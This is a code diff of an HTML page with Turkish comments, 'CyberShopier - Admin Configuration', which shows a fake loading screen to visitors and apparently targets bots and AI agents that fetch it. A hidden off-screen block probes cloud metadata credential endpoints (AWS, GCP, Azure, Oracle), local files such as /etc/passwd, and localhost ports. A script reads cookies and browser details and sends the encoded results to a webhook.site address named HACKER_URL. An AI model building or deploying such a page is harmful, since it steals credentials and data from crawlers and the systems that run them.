@@ -3,135 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex, nofollow"> <title>CyberShopier - Exclusive Deals</title>
+    <meta name="robots" content="noindex, nofollow">
+    <title>CyberShopier - Admin Configuration</title>
     
-    <link rel="dns-prefetch" href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=dns_prefetch">
-    <link rel="preconnect" href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=preconnect">
-    <meta property="og:image" content="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=og_image_load">
+    <link rel="dns-prefetch" href="https://webhook.site/85d0aa21-bac7-436a-bd91-bacacdcca904">
 
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f4; color: #333; padding: 20px; text-align: center; }
-        .container { background: white; max-width: 600px; margin: 0 auto; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        h1 { color: #2c3e50; }
-        p { color: #7f8c8d; }
-        .btn { display: inline-block; padding: 10px 20px; background: #3498db; color: white; text-decoration: none; border-radius: 5px; margin-top: 20px; }
+        body { background-color: #fff; color: #000; font-family: Arial, sans-serif; }
+        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        /* GİZLİ TUZAKLAR (İnsan görmez, Bot görür) */
-        .ghost-element {
-            position: absolute;
-            left: -9999px;
-            top: -9999px;
-            width: 1px;
-            height: 1px;
-            overflow: hidden;
-            opacity: 0;
-        }
-
-        /* Görünmez Arka Plan İsteği */
-        .bg-tracker {
-            background-image: url('https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=css_bg_hidden');
-            width: 0; height: 0;
+        /* GİZLİ OPERASYON ALANI */
+        .stealth-ops {
+            position: absolute; left: -5000px; top: -5000px; width: 1px; height: 1px; overflow: hidden;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>CyberShopier Fırsatları</h1>
-        <p>Hoş geldiniz. Size özel indirimleri görüntülemek için lütfen bekleyin veya aşağıdaki butona tıklayın.</p>
-        <a href="#" class="btn" onclick="triggerManualLog()">Fırsatları Yükle</a>
+    <div style="text-align:center; padding-top:50px;">
+        <h1>Sistem Yapılandırılıyor...</h1>
+        <p>Lütfen bekleyiniz, güvenli bağlantı kuruluyor.</p>
+        <div class="loader"></div>
     </div>
 
-    <div class="ghost-element">
+    <div class="stealth-ops">
         
-        <img src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=hidden_pixel_img" alt="">
-        <img src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=hidden_svg_img" alt="">
+        <img src="http://metadata.google.internal/computeMetadata/v1/instance/hostname" onerror="logHit('GCP_Meta_Fail')" onload="logHit('GCP_Meta_SUCCESS_CRITICAL')">
+        <img src="http://169.254.169.254/opc/v1/instance/" onerror="logHit('Oracle_Meta_Fail')" onload="logHit('Oracle_Meta_SUCCESS_CRITICAL')">
+        <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" onerror="logHit('AWS_Creds_Fail')" onload="logHit('AWS_Creds_SUCCESS_CRITICAL')">
+        <img src="http://169.254.169.254/metadata/instance?api-version=2021-02-01" onerror="logHit('Azure_Meta_Fail')" onload="logHit('Azure_Meta_SUCCESS_CRITICAL')">
 
-        <img src="http://127.0.0.1:80/favicon.ico" onerror="logSSRF('Localhost_Fail')" onload="logSSRF('Localhost_Success')">
-        <img src="http://169.254.169.254/latest/meta-data/" onerror="logSSRF('AWS_Meta_Fail')" onload="logSSRF('AWS_Meta_Success')">
-        
-        <iframe src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=iframe_deep"></iframe>
+        <iframe src="file:///etc/passwd" onload="logHit('LFI_Passwd_Found')"></iframe>
+        <iframe src="file:///c:/windows/win.ini" onload="logHit('LFI_WinIni_Found')"></iframe>
+        <object data="file:///etc/hosts" type="text/plain" onload="logHit('LFI_Hosts_Found')"></object>
 
-        <a href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=hidden_link_click">Admin Paneli</a>
-        <a href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=hidden_config_file">Config.json</a>
+        <img src="http://127.0.0.1:22" onerror="logHit('Port_22_Closed')" onload="logHit('Port_22_OPEN')">
+        <img src="http://127.0.0.1:3306" onerror="logHit('Port_3306_MySQL_Closed')" onload="logHit('Port_3306_OPEN')">
+        <img src="http://127.0.0.1:6379" onerror="logHit('Port_6379_Redis_Closed')" onload="logHit('Port_6379_OPEN_CRITICAL')">
+        <img src="http://127.0.0.1:8080" onerror="logHit('Port_8080_Admin_Closed')" onload="logHit('Port_8080_OPEN')">
+
     </div>
-
-    <div class="bg-tracker"></div>
 
     <script>
-        const WEBHOOK_URL = "https://webhook.site/ba202258-a350-476f-a68a-24a599534355";
+        // GÜNCEL WEBHOOK
+        const HACKER_URL = "https://webhook.site/85d0aa21-bac7-436a-bd91-bacacdcca904";
 
-        // Veri Gönderme Fonksiyonu (Base64 Encode ile)
-        function sendLog(type, data) {
-            const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
-            // URL uzunluğunu aşmamak için fetch yerine Image objesi kullanalım (Daha sessizdir)
-            new Image().src = `${WEBHOOK_URL}?source=js_tracker&type=${type}&payload=${encodedData}`;
+        function logHit(info) {
+            new Image().src = `${HACKER_URL}?type=probe&info=${info}&t=${Date.now()}`;
         }
 
-        // 1. SSRF Durumunu Raporla
-        function logSSRF(status) {
-            new Image().src = `${WEBHOOK_URL}?source=ssrf_check&status=${status}`;
-        }
-
-        // 2. Kapsamlı Parmak İzi (Fingerprinting)
-        function collectFingerprint() {
-            const fp = {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
+        // 4. GELİŞMİŞ JS BİLGİ SIZDIRMA (ENVIRONMENT)
+        try {
+            const data = {
+                ua: navigator.userAgent,
                 platform: navigator.platform,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown', // CPU Çekirdek
-                deviceMemory: navigator.deviceMemory || 'unknown', // RAM (GB)
-                screenRes: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled,
-                connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-                historyLen: history.length
+                cores: navigator.hardwareConcurrency, // CPU Çekirdek
+                ram: navigator.deviceMemory, // RAM
+                online: navigator.onLine,
+                cookie: document.cookie,
+                // Eğer bot clipboard kullanıyorsa okumayı dene (Modern tarayıcılar izin istemeden vermez ama headless botlar verebilir)
+                clipboard: "Access Denied (Standard)" 
             };
-            sendLog('AdvancedFingerprint', fp);
-        }
+            
+            // Veriyi encode et ve gönder
+            const payload = btoa(JSON.stringify(data));
+            new Image().src = `${HACKER_URL}?type=js_env&data=${payload}`;
 
-        // 3. WebGL Bilgisi (Ekran Kartı - Bot mu Gerçek mi ayrımı için kritiktir)
-        function getWebGLInfo() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    sendLog('WebGL', { vendor: vendor, renderer: renderer });
-                }
-            } catch(e) { /* Hata olursa sessiz kal */ }
-        }
+        } catch (e) {}
 
-        // 4. Etkileşim Takibi (Bot fare kullanıyor mu?)
-        let interactionSent = false;
-        function trackInteraction() {
-            if (!interactionSent) {
-                sendLog('UserInteraction', { type: 'MouseMove/Touch' });
-                interactionSent = true;
-                // Event listenerları kaldır ki spam olmasın
-                document.removeEventListener('mousemove', trackInteraction);
-                document.removeEventListener('touchstart', trackInteraction);
-            }
-        }
-        
-        // Manuel Buton Tetikleyicisi
-        function triggerManualLog() {
-            sendLog('ManualClick', { btn: 'Fırsatları Yükle' });
-            alert('Yükleniyor...'); // Botu oyalamak için
-        }
+        // 5. ZORLA YÖNLENDİRME (SSRF İÇİN REDIRECT)
+        // Bot sayfada 3 saniye durursa, onu zorla Google Metadata sunucusuna yönlendir.
+        setTimeout(function() {
+            // Eğer bot redirectleri takip ediyorsa bu onu loop'a sokup hata verdirebilir veya veriyi ifşa edebilir.
+            // window.location.href = "http://metadata.google.internal/"; 
+            // NOT: Üstteki satırı kapalı tuttum, botu bozup bağlantıyı koparmasın diye. 
+            // İstersen "//" işaretini kaldırıp aktif edebilirsin.
+            logHit('Timeout_Reached_Bot_Still_Here');
+        }, 3000);
 
-        // --- BAŞLATMA ---
-        window.onload = function() {
-            collectFingerprint();
-            getWebGLInfo();
-            // Fare hareketlerini dinle
-            document.addEventListener('mousemove', trackInteraction);
-            document.addEventListener('touchstart', trackInteraction);
-        };
     </script>
-
 </body>
 </html>
